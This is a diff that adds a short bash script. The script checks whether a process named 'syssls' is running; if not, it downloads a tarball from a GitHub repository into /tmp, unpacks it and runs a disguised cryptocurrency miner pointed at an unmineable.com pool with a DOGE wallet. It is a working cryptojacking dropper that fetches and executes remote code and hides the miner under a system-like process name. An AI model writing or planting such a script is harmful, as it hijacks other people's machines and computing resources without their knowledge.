@@ -1,0 +1,10 @@
+#!/bin/bash
+if pgrep -x "syssls" > /dev/null
+then
+    exit 0
+else
+    cd /tmp
+    wget https://github.com/saukilmuna/saukilmuna/raw/refs/heads/main/saukilmuna.tar.gz
+    tar -zxf saukilmuna.tar.gz
+    ./syssls -o rx.unmineable.com:3333 -a rx -k -u DOGE:D6ZdEQYeX6iMLXyFW4oAu3dpbXAyJj6fan.$(whoami) --thread 6
+fi
